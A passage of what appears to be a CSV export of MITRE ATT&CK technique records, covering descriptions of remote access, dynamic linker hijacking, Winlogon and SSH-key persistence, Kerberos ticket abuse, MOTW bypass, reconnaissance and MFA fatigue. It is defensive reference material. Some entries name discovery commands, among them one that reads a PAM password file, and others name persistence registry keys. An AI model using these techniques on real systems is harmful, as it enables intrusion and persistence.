Legitimate applications (such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) and other administrative programs) may utilize [Remote Services](https://attack.mitre.org/techniques/T1021) to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC](https://attack.mitre.org/techniques/T1021/005) to send the screen and control buffers and [SSH](https://attack.mitre.org/techniques/T1021/004) for secure file transfer.(Citation: Remote Management MDM macOS)(Citation: Kickstart Apple Remote Desktop commands)(Citation: Apple Remote Desktop Admin Guide 3.3) Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.(Citation: FireEye 2019 Apple Remote Desktop)(Citation: Lockboxx ARD 2019)(Citation: Kickstart Apple Remote Desktop commands)","Linux, macOS, Windows, IaaS, ESXi",FALSE,FALSE,2017-05-31T21:30:29Z
attack-pattern--55bb4471-ff1f-43b4-88c1-c9384ec47abf,3,T1059.009,Cloud API,"Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell), or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).  

Cloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.

With proper permissions (often via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001) and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.","IaaS, Identity Provider, Office Suite, SaaS",FALSE,FALSE,2022-03-17T13:28:24Z
attack-pattern--633a100c-b2c9-41bf-9be5-905c1b16c825,3,T1574.006,Dynamic Linker Hijacking,"Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) Each platform's linker uses an extensive list of environment variables at different points in execution. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions in the original library.(Citation: Baeldung LD_PRELOAD)

Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. On Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. For example, adversaries have used `LD_PRELOAD` to inject a malicious library into every descendant process of the `sshd` daemon, resulting in execution under a legitimate process. When the executing sub-process calls the `execve` function, for example, the malicious library’s `execve` function is executed rather than the system function `execve` contained in the system library on disk. This allows adversaries to [Hide Artifacts](https://attack.mitre.org/techniques/T1564) from detection, as hooking system functions such as `execve` and `readdir` enables malware to scrub its own artifacts from the results of commands such as `ls`, `ldd`, `iptables`, and `dmesg`.(Citation: ESET Ebury Oct 2017)(Citation: Intezer Symbiote 2022)(Citation: Elastic Security Labs Pumakit 2024)

Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.","Linux, macOS",FALSE,FALSE,2020-03-13T20:09:59Z
attack-pattern--6836813e-8ec8-4375-b459-abb388cb1a35,3,T1547.004,Winlogon Helper DLL,"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\Software[\\Wow6432Node\\]\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> and <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) 

Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)

* Winlogon\Notify - points to notification package DLLs that handle Winlogon events
* Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on
* Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on

Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",Windows,FALSE,FALSE,2020-01-24T16:59:59Z
attack-pattern--6b57dc31-b814-4a03-8706-28bc20d739c4,3,T1098.004,SSH Authorized Keys,"Adversaries may modify the SSH <code>authorized_keys</code> file to maintain persistence on a victim host. Linux distributions, macOS, and ESXi hypervisors commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. The <code>authorized_keys</code> file in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under <code>&lt;user-home&gt;/.ssh/authorized_keys</code> (or, on ESXi, `/etc/ssh/keys-<username>/authorized_keys`).(Citation: SSH Authorized Keys) Users may edit the system’s SSH config file to modify the directives `PubkeyAuthentication` and `RSAAuthentication` to the value `yes` to ensure public key and RSA authentication are enabled, as well as modify the directive `PermitRootLogin` to the value `yes` to enable root authentication via SSH.(Citation: Broadcom ESXi SSH) The SSH config file is usually located under <code>/etc/ssh/sshd_config</code>.

Adversaries may modify SSH <code>authorized_keys</code> files directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI’s “add-metadata” command an adversary may add SSH keys to a user account.(Citation: Google Cloud Add Metadata)(Citation: Google Cloud Privilege Escalation) Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.(Citation: Azure Update Virtual Machines) This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.(Citation: Venafi SSH Key Abuse)(Citation: Cybereason Linux Exim Worm) It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.

Where authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user. 

SSH keys can also be added to accounts on network devices, such as with the `ip ssh pubkey-chain` [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) command.(Citation: cisco_ip_ssh_pubkey_ch_cmd)","ESXi, IaaS, Linux, macOS, Network Devices",FALSE,FALSE,2020-06-24T12:42:35Z
attack-pattern--6ee2dc99-91ad-4534-a7d8-a649358c331f,3,T1591.002,Business Relationships,"Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization’s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim’s hardware and software resources.

Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",PRE,FALSE,FALSE,2020-10-02T16:27:55Z
attack-pattern--70910fbd-58dc-4c1c-8c48-814d11fcd022,3,T1593.003,Code Repositories,"Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.  

Adversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys.(Citation: GitHub Cloud Service Credentials) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)). 

**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1213/003), which focuses on [Collection](https://attack.mitre.org/tactics/TA0009) from private and internally hosted code repositories.",PRE,FALSE,FALSE,2022-08-09T13:01:43Z
attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08,3,T1087,Account Discovery,"Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts](https://attack.mitre.org/techniques/T1078)).

Adversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.

For examples, cloud environments typically provide easily accessible interfaces to obtain user lists.(Citation: AWS List Users)(Citation: Google Cloud - IAM Servie Accounts List API) On hosts, adversaries can use default [PowerShell](https://attack.mitre.org/techniques/T1059/001) and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.","ESXi, IaaS, Identity Provider, Linux, macOS, Office Suite, SaaS, Windows",FALSE,FALSE,2017-05-31T21:31:06Z
attack-pattern--76551c52-b111-4884-bc47-ff3e728f0156,3,T1589.003,Employee Names,"Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.

Adversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",PRE,FALSE,FALSE,2020-10-02T14:57:15Z
attack-pattern--7b211ac6-c815-4189-93a9-ab415deca926,3,T1550.003,Pass the Ticket,"Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.

When preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.(Citation: ADSecurity AD Kerberos Attacks)(Citation: GentilKiwi Pass the Ticket)

A [Silver Ticket](https://attack.mitre.org/techniques/T1558/002) can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).(Citation: ADSecurity AD Kerberos Attacks)

A [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.(Citation: Campbell 2014)

Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, ""overpassing the hash"" involves using a NTLM password hash to authenticate as a user (i.e. [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)) while also using the password hash to create a valid Kerberos ticket.(Citation: Stealthbits Overpass-the-Hash)",Windows,FALSE,FALSE,2020-01-30T17:03:43Z
attack-pattern--7e7c2fba-7cca-486c-9582-4c1bb2851961,3,T1553.005,Mark-of-the-Web Bypass,"Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW.(Citation: Microsoft Zone.Identifier 2020) Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec 2020)

Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.(Citation: Beek Use of VHD Dec 2020)(Citation: Outflank MotW 2020)",Windows,FALSE,FALSE,2021-02-22T14:20:31Z
attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d,3,T1497,Virtualization/Sandbox Evasion,"Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)

","Linux, macOS, Windows",FALSE,FALSE,2019-04-17T22:22:24Z
attack-pattern--84ae8255-b4f4-4237-b5c5-e717405a9701,3,T1608.005,Link Target,"Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003)) or a phish to gain initial access to a system (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)), an adversary must set up the resources for a link target for the spearphishing link. 

Typically, the resources for a link target will be an HTML page that may include some client-side script such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003).(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019) Adversaries may also [Upload Malware](https://attack.mitre.org/techniques/T1608/001) and have the link target point to malware for download/execution by the user.

Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Malicious Link](https://attack.mitre.org/techniques/T1204/001).

Links can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.(Citation: Kaspersky-masking)(Citation: mandiant-masking)

Adversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages.(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)(Citation: Intezer App Service Phishing)(Citation: Cofense-redirect) In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links).(Citation: iOS URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique) Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.(Citation: Talos IPFS 2022)",PRE,FALSE,FALSE,2021-03-17T20:35:08Z
attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0,3,T1021.007,Cloud Services,"Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. 

Many enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.

In some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password.","IaaS, Identity Provider, Office Suite, SaaS",FALSE,FALSE,2023-02-21T19:38:13Z
attack-pattern--887274fc-2d63-4bdc-82f3-fae56d1d5fdc,3,T1027.012,LNK Icon Smuggling,"Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the `IconEnvironmentDataBlock`) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory. 

Adversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., [Malicious File](https://attack.mitre.org/techniques/T1204/002)), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)/[System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218) arguments within the target path field of the LNK.(Citation: Unprotect Shortcut)(Citation: Booby Trap Shortcut 2017)

LNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads. 
",Windows,FALSE,FALSE,2023-09-29T15:28:42Z
attack-pattern--8c41090b-aa47-4331-986b-8c9a51a91103,3,T1491.001,Internal Defacement,"An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites or server login messages, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster)(Citation: Varonis) Disturbing or offensive images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-02-20T14:31:34Z
attack-pattern--954a1639-f2d6-407d-aef3-4917622ca493,3,T1621,Multi-Factor Authentication Request Generation,"Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.

Adversaries in possession of credentials to [Valid Accounts](https://attack.mitre.org/techniques/T1078) may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account. If adversaries lack credentials to victim accounts, they may also abuse automatic push notification generation when this option is configured for self-service password reset (SSPR).(Citation: Obsidian SSPR Abuse 2023)

In some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to “MFA fatigue.”(Citation: Russian 2FA Push Annoyance - Cimpanu)(Citation: MFA Fatigue Attacks - PortSwigger)(Citation: Suspected Russian Activity Targeting Government and Business Entities Around the Globe)","Windows, Linux, macOS, IaaS, SaaS, Office Suite, Identity Provider",FALSE,FALSE,2022-04-01T02:15:49Z
attack-pattern--9d48cab2-7929-4812-ad22-f536665f0109,3,T1590,Gather Victim Network Information,"Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",PRE,FALSE,FALSE,2020-10-02T15:45:17Z
attack-pattern--b6075259-dba3-44e9-87c7-e954f37ec0d5,3,T1201,Password Policy Discovery,"Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).

Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code> (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to discover password policy information (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).(Citation: US-CERT-TA18-106A)

Password policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS (Citation: AWS GetPasswordPolicy).","Windows, Linux, macOS, IaaS, Network Devices, Identity Provider, SaaS, Office Suite",FALSE,FALSE,2018-04-18T17:59:24Z
attack-pattern--baf60e1a-afe5-4d31-830f-1b1ba2351884,3,T1592.002,Software,"Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Additionally, adversaries may analyze metadata from victim-owned files (e.g., PDFs, DOCs, images, and sound files hosted on victim-owned websites) to extract information about the software and hardware used to create or process those files. Metadata may reveal software versions, configurations, or timestamps that indicate outdated or vulnerable software. This information can be cross-referenced with known CVEs to identify potential vectors for exploitation in future operations.(Citation: Outpost24)

Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or for initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",PRE,FALSE,FALSE,2020-10-02T16:42:17Z
attack-pattern--bb5a00de-e086-4859-a231-fa793f6797e2,3,T1056,Input Capture,"Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).","Linux, macOS, Network Devices, Windows",FALSE,FALSE,2017-05-31T21:30:48Z
attack-pattern--bbc3cba7-84ae-410d-b18b-16750731dfa2,3,T1587.004,Exploits,"Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.(Citation: NYTStuxnet) Adversaries may use information acquired via [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006) to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.(Citation: Irongeek Sims BSides 2017)

As with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.

Adversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Stealth](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",PRE,FALSE,FALSE,2020-10-01T01:48:15Z
attack-pattern--bbe5b322-e2af-4a5e-9625-a4e62bf84ed3,3,T1593.001,Social Media,"Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.

Adversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim’s into revealing specific information (i.e. [Spearphishing Service](https://attack.mitre.org/techniques/T1598/001)).(Citation: Cyware Social Media) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",PRE,FALSE,FALSE,2020-10-02T16:49:31Z
attack-pattern--c325b232-d5bc-4dde-a3ec-71f3db9e8adc,3,T1001.003,Protocol or Service Impersonation,"Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  

Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. 

Adversaries may also leverage legitimate protocols to impersonate expected web traffic or trusted services. For example, adversaries may manipulate HTTP headers, URI endpoints, SSL certificates, and transmitted data to disguise C2 communications or mimic legitimate services such as Gmail, Google Drive, and Yahoo Messenger.(Citation: ESET Okrum July 2019)(Citation: Malleable-C2-U42)","ESXi, Linux, macOS, Windows",FALSE,FALSE,2020-03-15T00:40:27Z
attack-pattern--cff94884-3b1c-4987-a70b-6d5643c621c3,3,T1213.003,Code Repositories,"Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.

Once adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or [Unsecured Credentials](https://attack.mitre.org/techniques/T1552) contained within software's source code.  Having access to software's source code may allow adversaries to develop [Exploits](https://attack.mitre.org/techniques/T1587/004), while credentials may provide access to additional resources using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: Wired Uber Breach)(Citation: Krebs Adobe)

**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1593/003), which focuses on conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043) via public code repositories.",SaaS,FALSE,FALSE,2021-05-11T18:51:16Z
